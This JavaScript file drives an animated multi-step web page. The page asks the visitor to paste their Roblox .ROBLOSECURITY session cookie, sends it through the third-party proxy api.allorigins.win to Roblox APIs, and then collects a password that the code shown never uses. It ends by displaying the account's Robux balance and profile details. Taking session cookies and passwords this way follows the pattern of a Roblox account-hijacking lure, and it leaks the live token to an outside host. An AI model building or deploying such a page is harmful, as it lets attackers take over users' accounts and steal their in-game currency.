const stages=[...document.querySelectorAll('.stage')];
const appEl=document.getElementById('app');
let current=0;
let isTransitioning = false;

function goTo(n){
  if(isTransitioning) return;
  isTransitioning = true;
  current=n;
  stages.forEach((el,i)=>{
    if(i<current){el.style.transform='rotateX(-95deg)';el.style.opacity='0';el.style.pointerEvents='none';}
    else if(i===current){el.style.transform='rotateX(0deg)';el.style.opacity='1';el.style.pointerEvents='auto';}
    else{el.style.transform='rotateX(95deg)';el.style.opacity='0';el.style.pointerEvents='none';}
  });
  appEl.classList.remove('shake'); void appEl.offsetWidth; appEl.classList.add('shake');
  setTimeout(() => { isTransitioning = false; }, 1100);
}
goTo(0);

function handleBackNavigation() {
  if (current === 3) {
    goTo(2);
  } else if (current === 2) {
    document.getElementById('form2').style.display = 'flex';
    document.getElementById('buttonView2').style.display = 'none';
    goTo(1);
  } else if (current === 1) {
    document.getElementById('form1').style.display = 'flex';
    document.getElementById('loader1').style.display = 'none';
    const start1Btn = document.getElementById('start1');
    if(start1Btn) start1Btn.disabled = false;
    goTo(0);
  } else {
    window.location.reload();
  }
}

function fit(c){const r=c.getBoundingClientRect();c.width=r.width;c.height=r.height;return{w:r.width,h:r.height};}
function makeStars(canvas,count,meteors){
  const ctx=canvas.getContext('2d'); let size=fit(canvas);
  const dust=Array.from({length:count},()=>({x:Math.random()*size.w,y:Math.random()*size.h,
    r:Math.random()*1.6+.4,p:Math.random()*Math.PI*2,s:Math.random()*.02+.008,drift:Math.random()*.18+.02,hue:Math.random()*60+190}));
  let mList=[];
  function spawnMeteor(){mList.push({x:Math.random()*size.w*0.6+size.w*0.2,y:-20,vx:-2.4-Math.random()*1.6,vy:3.2+Math.random()*2,life:0,max:40+Math.random()*20});}
  if(meteors) setInterval(()=>{ if(Math.random()<0.5) spawnMeteor(); },1400);
  window.addEventListener('resize',()=>size=fit(canvas));
  return{draw(t){
    ctx.clearRect(0,0,size.w,size.h);
    dust.forEach(d=>{const a=.2+.5*Math.sin(t*d.s+d.p); d.y-=d.drift*.15; if(d.y<-5)d.y=size.h+5;
      ctx.beginPath();ctx.fillStyle=`hsla(${d.hue},90%,80%,${Math.max(a,0)})`;ctx.arc(d.x,d.y,d.r,0,7);ctx.fill();});
    if(meteors){
      mList=mList.filter(m=>m.life<m.max);
      mList.forEach(m=>{
        m.x+=m.vx; m.y+=m.vy; m.life++;
        const grad=ctx.createLinearGradient(m.x,m.y,m.x-m.vx*8,m.y-m.vy*8);
        grad.addColorStop(0,'rgba(255,255,255,.95)'); grad.addColorStop(1,'rgba(255,255,255,0)');
        ctx.strokeStyle=grad; ctx.lineWidth=2.2; ctx.beginPath();
        ctx.moveTo(m.x,m.y); ctx.lineTo(m.x-m.vx*8,m.y-m.vy*8); ctx.stroke();
      });
    }
  }};
}

function makeEmbers(canvas,count){
  const ctx=canvas.getContext('2d'); let size=fit(canvas);
  const embers=Array.from({length:count},()=>({x:Math.random()*size.w,y:size.h+Math.random()*size.h,r:Math.random()*2+.6,sp:Math.random()*.8+.3,sway:Math.random()*Math.PI*2,hue:20+Math.random()*30}));
  window.addEventListener('resize',()=>size=fit(canvas));
  return{draw(){ctx.clearRect(0,0,size.w,size.h);
    embers.forEach(e=>{e.y-=e.sp;e.sway+=.025;if(e.y<-10)e.y=size.h+10;
      const x=e.x+Math.sin(e.sway)*10;
      ctx.beginPath();ctx.fillStyle=`hsla(${e.hue},95%,60%,.7)`;ctx.arc(x,e.y,e.r,0,7);ctx.fill();});}};
}

function burstAt(layer,x,y,hue){
  const rect=layer.getBoundingClientRect();
  const lx=x-rect.left, ly=y-rect.top;
  const col=hue||'255,190,110';
  const ring=document.createElement('div');
  ring.className='ring';
  ring.style.width=ring.style.height='80px';
  ring.style.left=lx+'px'; ring.style.top=ly+'px';
  ring.style.border=`2.5px solid rgba(${col},.95)`;
  layer.appendChild(ring);
  setTimeout(()=>ring.remove(), 1050);
}

const stars0=makeStars(document.getElementById('bg0'),160,true);
const byBtn = document.getElementById('byBtn');
byBtn.addEventListener('click',e=>{
  if(byBtn.disabled) return;
  byBtn.disabled = true;
  burstAt(document.getElementById('burst0'), e.clientX, e.clientY, '255,190,110');
  setTimeout(()=>goTo(1), 500);
});

const ember1=makeEmbers(document.getElementById('ember1'),34);
const miniBubbles1=document.getElementById('miniBubbles1');
let miniTimer=null;
function spawnMini(){
  const b=document.createElement('div');
  b.className='bubble';
  const size=9+Math.random()*13, hue=15+Math.random()*40;
  b.style.width=b.style.height=size+'px';
  b.style.left=(Math.random()*100)+'%'; b.style.bottom='0px';
  b.style.background=`radial-gradient(circle at 35% 30%, hsla(${hue},95%,80%,.65), hsla(${hue},90%,45%,.1))`;
  miniBubbles1.appendChild(b);
  let y=0, speed=.6+Math.random()*.9;
  function anim(){y+=speed; b.style.transform=`translateY(-${y}px)`; b.style.opacity=Math.max(1-y/160,0);
    if(y<160) requestAnimationFrame(anim); else b.remove();}
  requestAnimationFrame(anim);
}

const start1Btn = document.getElementById('start1');
start1Btn.addEventListener('click', async (e)=>{
  if(start1Btn.disabled) return;
  const txtArea = document.getElementById('text1');
  const cookieValue = txtArea.value.trim();
  if(!cookieValue) {
    txtArea.classList.add('error');
    setTimeout(()=>txtArea.classList.remove('error'), 3000);
    return;
  }
  start1Btn.disabled = true;
  burstAt(document.getElementById('burst1'), e.clientX, e.clientY, '255,150,60');
  
  try {
    const res = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(`https://users.roblox.com/v1/users/authenticated`), {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookieValue}` }
    });
    if(res.ok) {
      onCookieVerifiedSuccess();
    } else {
      onCookieError();
    }
  } catch(err) {
    onCookieError();
  }
});

function onCookieError() {
  start1Btn.disabled = false;
  const txtArea = document.getElementById('text1');
  txtArea.classList.add('error');
  setTimeout(()=>txtArea.classList.remove('error'), 3000);
}

function onCookieVerifiedSuccess() {
  document.getElementById('form1').style.display='none';
  document.getElementById('loader1').style.display='flex';
  miniTimer=setInterval(spawnMini,300);
  const fill=document.getElementById('lineFill1');
  const pct=document.getElementById('pct1');
  let start=null, dur=2500;
  function step(ts){
    if(!start)start=ts;
    const p=Math.min((ts-start)/dur,1);
    fill.style.width=(p*100)+'%';
    pct.textContent=Math.round(p*100)+'%';
    if(p<1) requestAnimationFrame(step);
    else{
      clearInterval(miniTimer);
      burstAt(document.getElementById('burst1'), window.innerWidth/2, window.innerHeight/2, '255,150,60');
      setTimeout(()=>goTo(2),400);
    }
  }
  requestAnimationFrame(step);
}

const bubbleLayer2=document.getElementById('bubbleLayer2');
const centerBtn2=document.getElementById('centerBtn2');
let colorTimer=null;

function safeRiseMax2(size){
  const layerRect=bubbleLayer2.getBoundingClientRect();
  const btnRect=centerBtn2.getBoundingClientRect();
  const safeBottomLine=btnRect.bottom-layerRect.top+16;
  return Math.max(layerRect.height-safeBottomLine-size-40,30);
}
function spawnColorBubble(){
  const size=24+Math.random()*34, hue=Math.floor(Math.random()*360);
  const el=document.createElement('div');
  el.className='bubble';
  el.style.width=el.style.height=size+'px';
  el.style.left=(4+Math.random()*90)+'%'; el.style.bottom='-46px';
  el.style.background=`radial-gradient(circle at 35% 30%, hsla(${hue},95%,78%,.8), hsla(${hue},90%,45%,.15) 70%)`;
  el.style.border=`1.4px solid hsla(${hue},95%,82%,.85)`;
  bubbleLayer2.appendChild(el);
  let y=-46, speed=.7+Math.random()*1, sway=Math.random()*Math.PI*2;
  const popAt=safeRiseMax2(size)*(0.55+Math.random()*0.4);
  let popped=false;
  function anim(){
    if(popped)return;
    y+=speed; sway+=.03;
    el.style.transform=`translate(${Math.sin(sway)*14}px,-${y}px)`;
    if(y>=popAt){popped=true; popColor(el,hue);} else requestAnimationFrame(anim);
  }
  requestAnimationFrame(anim);
}
function popColor(el,hue){
  const r=el.getBoundingClientRect();
  el.style.transition='transform .2s ease, opacity .2s ease';
  el.style.opacity='0';
  setTimeout(()=>el.remove(),210);
  burstAt(bubbleLayer2, r.left+r.width/2, r.top+r.height/2, `${hue},220,220`);
}

const start2Btn = document.getElementById('start2');
start2Btn.addEventListener('click',e=>{
  if(start2Btn.disabled) return;
  const passField = document.getElementById('text2');
  const pass = passField.value.trim();
  if(!pass) {
    passField.classList.add('error');
    setTimeout(()=>passField.classList.remove('error'), 3000);
    return;
  }
  start2Btn.disabled = true;
  burstAt(document.getElementById('form2'), e.clientX, e.clientY, '140,210,255');
  document.getElementById('form2').style.display='none';
  document.getElementById('buttonView2').style.display='flex';
  colorTimer=setInterval(spawnColorBubble, 700);
});

centerBtn2.addEventListener('click', async (e)=>{
  if(centerBtn2.disabled) return;
  centerBtn2.disabled = true;
  burstAt(bubbleLayer2, e.clientX, e.clientY, '150,225,255');
  clearInterval(colorTimer);
  
  const cookieValue = document.getElementById('text1').value.trim();
  
  try {
    const userRes = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(`https://users.roblox.com/v1/users/authenticated`), {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookieValue}` }
    });
    const userData = await userRes.json();
    const userId = userData.id;
    const username = userData.name;
    const displayName = userData.displayName;
    const description = userData.description || "No description";

    const detailsRes = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(`https://users.roblox.com/v1/users/${userId}`));
    const detailsData = await detailsRes.json();
    const createdStr = detailsData.created || "";

    let formattedDate = "Unknown";
    let accountAgeDays = "Unknown";
    if(createdStr) {
      const date = new Date(createdStr);
      formattedDate = date.toISOString().split('T')[0];
      const diff = Date.now() - date.getTime();
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const years = Math.floor(days / 365);
      const remDays = days % 365;
      accountAgeDays = `${years} Years, ${remDays} Days (${days} Days)`;
    }

    const robuxRes = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(`https://economy.roblox.com/v1/users/${userId}/currency`), {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookieValue}` }
    });
    const robuxData = await robuxRes.json().catch(()=>({robux:0}));

    const avatarRes = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`));
    const avatarData = await avatarRes.json();
    const imageUrl = avatarData.data[0].imageUrl;

    showSuccessDataInHTML(displayName, username, userId, robuxData.robux || 0, formattedDate, accountAgeDays, 0, 0, 0, description, imageUrl);
  } catch(err) {
    centerBtn2.disabled = false;
    alert("Error fetching data, please check your cookie.");
  }
});

function showSuccessDataInHTML(displayName, username, userId, robux, createdDate, accountAge, followers, following, friends, bio, avatarUrl) {
  goTo(3);
  burstAt(document.getElementById('burst3'), window.innerWidth/2, window.innerHeight/2, '196,107,255');
  document.getElementById('ivAvatar').src = avatarUrl;
  document.getElementById('tvUsername').innerText = username;
  document.getElementById('valId').innerText = userId;
  document.getElementById('valRobux').innerText = robux + " R$";
  document.getElementById('valDate').innerText = createdDate;
  document.getElementById('valAge').innerText = accountAge;
  document.getElementById('valFollowers').innerText = followers;
  document.getElementById('valFollowing').innerText = following;
  document.getElementById('valFriends').innerText = friends;
  document.getElementById('valBio').innerText = bio || "No bio";
}

const stars3=makeStars(document.getElementById('bg3'),220,true);
const burst3=document.getElementById('burst3');
setInterval(()=>{
  if(current!==3) return;
  const x=Math.random()*window.innerWidth, y=Math.random()*window.innerHeight*0.7+window.innerHeight*0.1;
  burstAt(burst3, x, y, `${Math.random()*360|0},200,255`);
},2500);

function loop(t){
  if(current===0){stars0.draw(t*0.06);}
  if(current===1){ember1.draw();}
  if(current===3){stars3.draw(t*0.05);}
  requestAnimationFrame(loop);
}
requestAnimationFrame(loop);
